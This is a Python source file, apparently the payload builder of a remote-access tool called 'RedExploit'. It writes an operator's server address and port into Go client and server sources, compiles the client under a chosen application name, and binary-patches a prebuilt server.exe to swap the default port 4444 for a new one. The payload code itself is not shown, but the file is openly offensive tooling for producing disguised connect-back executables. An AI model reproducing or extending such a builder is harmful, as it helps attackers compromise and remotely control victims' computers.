from __init__ import *

import json
import subprocess
import shutil
import re
import os
import sys

GO_PATH = "RedExploit/source/go"

with open('RedExploit/configure/c.json', 'r') as f:
    COMPILE_GO_PATH = json.load(f)["go"]


def cmd_compile(client_path, server_path, out_path, lang, app_name):
    match lang:
        case "go":
            try:
                client_c = [COMPILE_GO_PATH, "build", client_path]

                result = subprocess.run(client_c, check=True, capture_output=True, text=True)

                server_c = [COMPILE_GO_PATH, "build", server_path]

                result = subprocess.run(server_c, check=True, capture_output=True, text=True)
            except:
                print("â–· RedExploit requires a go compiler. You can install it on the official website")

                sys.exit(0)

            shutil.move(f"client.exe", os.path.join(out_path, f"{out_path}/{app_name}.exe"))
            shutil.move(f"server.exe", os.path.join(out_path, f"{out_path}/server.exe"))

def build_go(port, app_name, server_addr, folder_path):

    with open(f'{GO_PATH}/client.go', 'r') as file:
        go_script = file.read()

    go_script = re.sub(r'serverAddr = ".*?"', f'serverAddr = "{server_addr}"', go_script)

    with open(f'{GO_PATH}/client.go', 'w') as file:
        file.write(go_script)


    with open(f'{GO_PATH}/server.go', 'r') as file:
        go_script = file.read()

    go_script = re.sub(r'port = ".*?"', f'port = ":{port}"', go_script)

    with open(f'{GO_PATH}/server.go', 'w') as file:
        file.write(go_script)

    cmd_compile(f'{GO_PATH}/client.go', f'{GO_PATH}/server.go', folder_path, "go", app_name)


def build_cpp(port, app_name):
    exe_file = 'RedExploit/source/server.exe'

    pe = pefile.PE(exe_file)

    found = False
    for section in pe.sections:
        if b'.data' in section.Name or b'.rdata' in section.Name:
            data_start = section.VirtualAddress
            data_end = data_start + section.SizeOfRawData
            
            for offset in range(data_start, data_end - 3):
                if pe.get_dword_at_rva(offset) == 4444:
                    pe.set_dword_at_rva(offset, port)
                    found = True
                    break
            if found:
                break

    if found:
        pe.write(f'RedExploit/builds/{app_name}.exe')
    else:
        sys.exit()

    pe.close()